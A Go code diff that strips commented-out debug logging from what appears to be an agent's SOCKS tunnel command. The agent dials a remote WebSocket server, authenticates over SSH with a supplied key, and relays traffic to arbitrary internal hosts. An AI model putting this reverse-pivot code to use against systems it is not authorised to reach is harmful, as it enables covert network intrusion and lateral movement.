@@ -64,7 +64,6 @@ type TunnelInfo struct {
 }
 
 func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// log.Printf("[SOCKS] Execute called with %d args", len(args))
 
 	// Get the JSON data from the CurrentCommand in context
 	var rawData string
@@ -72,7 +71,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	ctx.mu.RLock()
 	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
 		rawData = ctx.CurrentCommand.Data
-		// log.Printf("[SOCKS] Got data from CurrentCommand.Data")
 	}
 	ctx.mu.RUnlock()
 
@@ -121,7 +119,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	switch socksData.Action {
 	case actionStart:
-		// log.Printf("[SOCKS] Starting SOCKS tunnel client...")
 
 		// Configure dialer with TLS settings
 		dialer := websocket.Dialer{
@@ -139,14 +136,11 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			socksData.WSSPort,
 			socksData.Path,
 		)
-		// log.Printf("[SOCKS] Connecting to WebSocket: %s", wsURL)
 
 		wsConn, resp, err := dialer.Dial(wsURL, nil)
 		if err != nil {
-			// log.Printf("[SOCKS] ERROR: WebSocket connection failed: %v", err)
 			if resp != nil {
 				_, _ = io.ReadAll(resp.Body)
-				// log.Printf("[SOCKS] Response: %s", string(respBody))
 				resp.Body.Close()
 			}
 			return CommandResult{
@@ -157,7 +151,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			}
 		}
 
-		// log.Printf("[SOCKS] WebSocket connected successfully")
 
 		// Configure SSH client
 		sshConfig := &ssh.ClientConfig{
@@ -171,22 +164,17 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 		// Add SSH key authentication if provided
 		if socksData.Credentials.SSHKey != "" {
-			// log.Printf("[SOCKS] Decoding SSH key...")
 			keyBytes, err := base64.StdEncoding.DecodeString(socksData.Credentials.SSHKey)
 			if err != nil {
-				// log.Printf("[SOCKS] Failed to decode SSH key: %v", err)
 			} else {
 				signer, err := ssh.ParsePrivateKey(keyBytes)
 				if err == nil {
 					sshConfig.Auth = append(sshConfig.Auth, ssh.PublicKeys(signer))
-					// log.Printf("[SOCKS] SSH key authentication added")
 				} else {
-					// log.Printf("[SOCKS] Failed to parse SSH key: %v", err)
 				}
 			}
 		}
 
-		// log.Printf("[SOCKS] Starting SSH handshake as user: %s", socksData.Credentials.Username)
 
 		// Wrap WebSocket connection for SSH
 		wrapped := &wsConnWrapper{conn: wsConn}
@@ -201,7 +189,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			}
 		}
 
-		// log.Printf("[SOCKS] SSH tunnel established successfully")
 
 		// Store connections
 		c.mu.Lock()
@@ -233,7 +220,6 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		}
 
 	case actionStop:
-		// log.Printf("[SOCKS] Stopping SOCKS tunnel...")
 
 		c.mu.Lock()
 		if c.cleanupShutdown != nil {
@@ -351,7 +337,6 @@ func (c *SocksCommand) cleanupStaleTunnels() {
 			for connID, info := range c.activeTunnels {
 				// Remove tunnels idle for more than 5 minutes
 				if now.Sub(info.LastActivity) > 5*time.Minute {
-					// log.Printf("[SOCKS] Cleaning up stale tunnel: %s (target: %s)", connID, info.Target)
 					delete(c.activeTunnels, connID)
 					c.mu.Lock()
 					c.currentConns--
@@ -362,20 +347,17 @@ func (c *SocksCommand) cleanupStaleTunnels() {
 			c.tunnelsMu.Unlock()
 
 		case <-c.cleanupShutdown:
-			// log.Printf("[SOCKS] Cleanup goroutine shutting down")
 			return
 		}
 	}
 }
 
 func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
-	// log.Printf("[SOCKS] Ready to handle forwarding channels")
 
 	for newChannel := range chans {
 		go c.handleChannelOpen(newChannel)
 	}
 
-	// log.Printf("[SOCKS] Channel handler stopped")
 }
 
 func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
@@ -414,19 +396,16 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	}
 
 	if err := ssh.Unmarshal(newChannel.ExtraData(), &req); err != nil {
-		// log.Printf("[SOCKS] Failed to parse channel request: %v", err)
 		newChannel.Reject(ssh.ConnectionFailed, Err(E18))
 		return
 	}
 
 	// The DestAddr contains the target address (host:port)
 	target := req.DestAddr
-	// log.Printf("[SOCKS] Connecting to target: %s", target)
 
 	// Connect to the target with timeout
 	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
 	if err != nil {
-		// log.Printf("[SOCKS] Failed to connect to %s: %v", target, err)
 		newChannel.Reject(ssh.ConnectionFailed, Err(E12))
 		return
 	}
@@ -434,12 +413,10 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	// Accept the channel
 	channel, requests, err := newChannel.Accept()
 	if err != nil {
-		// log.Printf("[SOCKS] Failed to accept channel: %v", err)
 		targetConn.Close()
 		return
 	}
 
-	// log.Printf("[SOCKS] Channel accepted, starting proxy for %s", target)
 
 	// Track this tunnel
 	connID := fmt.Sprintf("%s_%d", target, time.Now().UnixNano())
@@ -476,13 +453,11 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 		defer wg.Done()
 		_, err := c.copyWithTimeout(targetConn, channel, connID, true)
 		if err != nil && err != io.EOF {
-			// log.Printf("[SOCKS] Channel->Target error for %s: %v", target, err)
 			select {
 			case errChan <- err:
 			default:
 			}
 		}
-		// log.Printf("[SOCKS] Channel->Target transferred %d bytes for %s", bytes, target)
 		// Close write side to signal EOF to target
 		if tcpConn, ok := targetConn.(*net.TCPConn); ok {
 			tcpConn.CloseWrite()
@@ -494,13 +469,11 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 		defer wg.Done()
 		_, err := c.copyWithTimeout(channel, targetConn, connID, false)
 		if err != nil && err != io.EOF {
-			// log.Printf("[SOCKS] Target->Channel error for %s: %v", target, err)
 			select {
 			case errChan <- err:
 			default:
 			}
 		}
-		// log.Printf("[SOCKS] Target->Channel transferred %d bytes for %s", bytes, target)
 		// Close write side to signal EOF to channel
 		channel.CloseWrite()
 	}()
@@ -521,7 +494,6 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	close(done)
 	targetConn.Close()
 	channel.Close()
-	// log.Printf("[SOCKS] Connection closed for %s", target)
 }
 
 // copyWithTimeout copies data with timeout enforcement and activity tracking
